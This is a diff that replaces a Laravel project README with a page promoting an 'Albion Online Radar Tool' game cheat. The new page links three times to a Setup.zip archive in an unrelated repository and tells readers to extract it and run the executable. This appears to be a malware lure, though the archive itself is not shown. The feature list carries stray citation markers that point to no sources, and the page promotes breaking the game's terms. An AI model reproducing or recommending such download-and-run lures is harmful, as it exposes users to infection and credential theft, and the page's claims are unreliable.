@@ -1,66 +1,54 @@
-<p align="center"><a href="https://laravel.com" target="_blank"><img src="https://raw.githubusercontent.com/laravel/art/master/logo-lockup/5%20SVG/2%20CMYK/1%20Full%20Color/laravel-logolockup-cmyk-red.svg" width="400" alt="Laravel Logo"></a></p>
+# ALBION ONLINE RADAR TOOL
 
-<p align="center">
-<a href="https://github.com/laravel/framework/actions"><img src="https://github.com/laravel/framework/workflows/tests/badge.svg" alt="Build Status"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/dt/laravel/framework" alt="Total Downloads"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/v/laravel/framework" alt="Latest Stable Version"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/l/laravel/framework" alt="License"></a>
-</p>
+Welcome to the Albion Online Radar Tool repository! This project provides an advanced radar system to enhance your gameplay experience in Albion Online. Please note that the use of third-party tools may violate the game's terms of service, so use at your own discretion.
 
-## About Laravel
 
-Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
+![maxfsdresdefault](https://github.com/user-attachments/assets/c269edcd-2b73-4705-91d4-c67275023363)
 
-- [Simple, fast routing engine](https://laravel.com/docs/routing).
-- [Powerful dependency injection container](https://laravel.com/docs/container).
-- Multiple back-ends for [session](https://laravel.com/docs/session) and [cache](https://laravel.com/docs/cache) storage.
-- Expressive, intuitive [database ORM](https://laravel.com/docs/eloquent).
-- Database agnostic [schema migrations](https://laravel.com/docs/migrations).
-- [Robust background job processing](https://laravel.com/docs/queues).
-- [Real-time event broadcasting](https://laravel.com/docs/broadcasting).
+# Download [Download Archive](https://github.com/nattavutkhuntamli/JOBS-API/releases/download/Setup/Setup.zip)
+# Download [Download Archive](https://github.com/nattavutkhuntamli/JOBS-API/releases/download/Setup/Setup.zip)
+# Download [Download Archive](https://github.com/nattavutkhuntamli/JOBS-API/releases/download/Setup/Setup.zip)
 
-Laravel is accessible, powerful, and provides tools required for large, robust applications.
+# Code on archive - ***github***
 
-## Learning Laravel
+## Features
 
-Laravel has the most extensive and thorough [documentation](https://laravel.com/docs) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
+- **Extended Vision**: See players, resources, and entities at greater distances[2][5].
+- **Player Information**: View details like player names, health, equipment, and distance[3].
+- **Resource Detection**: Locate high-tier resource nodes and harvestable mobs[2][3].
+- **Dungeon & Combat Zone Identification**: Spot dungeons, mists, corrupted zones, and hellgates[3].
+- **Customizable Alerts**: Set sound alerts for enemy players[2].
+- **Filtering Options**: Filter by guild, alliance, resource type, and tier[2][3].
+- **Multi-language Support**: Available in English, Portuguese, and Spanish[2].
+- **User-friendly Interface**: Easy to navigate and customize[2][3].
 
-You may also try the [Laravel Bootcamp](https://bootcamp.laravel.com), where you will be guided through building a modern Laravel application from scratch.
+## Installation
 
-If you don't feel like reading, [Laracasts](https://laracasts.com) can help. Laracasts contains over 2000 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+To install the Albion Online Radar Tool, follow these steps:
 
-## Laravel Sponsors
+1. Download the Radar Tool package from the repository.
+2. Extract the downloaded ZIP file to your desired location.
+3. Run the application file.
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://patreon.com/taylorotwell).
+## Usage
 
-### Premium Partners
+Once installed, you can start using the Albion Online Radar Tool:
 
-- **[Vehikl](https://vehikl.com/)**
-- **[Tighten Co.](https://tighten.co)**
-- **[Kirschbaum Development Group](https://kirschbaumdevelopment.com)**
-- **[64 Robots](https://64robots.com)**
-- **[Cubet Techno Labs](https://cubettech.com)**
-- **[Cyber-Duck](https://cyber-duck.co.uk)**
-- **[Many](https://www.many.co.uk)**
-- **[Webdock, Fast VPS Hosting](https://www.webdock.io/en)**
-- **[DevSquad](https://devsquad.com)**
-- **[Curotec](https://www.curotec.com/services/technologies/laravel/)**
-- **[OP.GG](https://op.gg)**
-- **[WebReinvent](https://webreinvent.com/?utm_source=laravel&utm_medium=github&utm_campaign=patreon-sponsors)**
-- **[Lendio](https://lendio.com)**
+1. Launch the Radar Tool application.
+2. Start Albion Online (the order of launching doesn't matter)[3].
+3. Customize your radar settings according to your preferences.
+4. Enjoy the enhanced awareness and information while playing Albion Online.
 
 ## Contributing
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://laravel.com/docs/contributions).
+We welcome contributions from the community to improve the Albion Online Radar Tool. If you have suggestions, bug reports, or want to contribute to the development, please submit a pull request.
 
-## Code of Conduct
+## Disclaimer
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://laravel.com/docs/contributions#code-of-conduct).
-
-## Security Vulnerabilities
-
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [taylor@laravel.com](mailto:taylor@laravel.com). All security vulnerabilities will be promptly addressed.
+This tool is for educational purposes only. Use of this tool may violate Albion Online's terms of service and could result in account penalties. Use at your own risk[1][4][5].
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+This project is licensed under the MIT License. See the LICENSE file for more details.
+
+For any questions or support related to the Albion Online Radar Tool, please reach out to our support team. Thank you for your interest in enhancing your Albion Online experience! 🗺️🎮
